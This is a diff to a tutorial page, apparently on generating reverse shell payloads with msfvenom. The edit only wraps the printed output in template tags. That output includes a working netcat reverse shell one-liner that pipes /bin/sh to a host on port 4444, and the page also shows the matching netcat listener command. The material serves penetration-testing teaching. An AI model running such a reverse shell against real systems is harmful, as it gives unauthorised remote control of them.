@@ -322,11 +322,11 @@ The basic options used in msfvenom.
 - `R` - export payload in raw format
 
 An output similar to below will be obtained.
-{% capture code %}[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 89 bytes
-mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn | /bin/sh >/tmp/gqbn 2>&1; rm /tmp/gqbn{% endcapture %} {% include code.html code=code lang="bash"%}
+mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn | /bin/sh >/tmp/gqbn 2>&1; rm /tmp/gqbn{% endraw %} {% endcapture %} {% include code.html code=code lang="bash"%}
 
 Use `netcat` to listen for reverse proxy connection in separate session.
 {% capture code %}nc -lvp 4444{% endcapture %} {% include code.html code=code lang="bash"%}
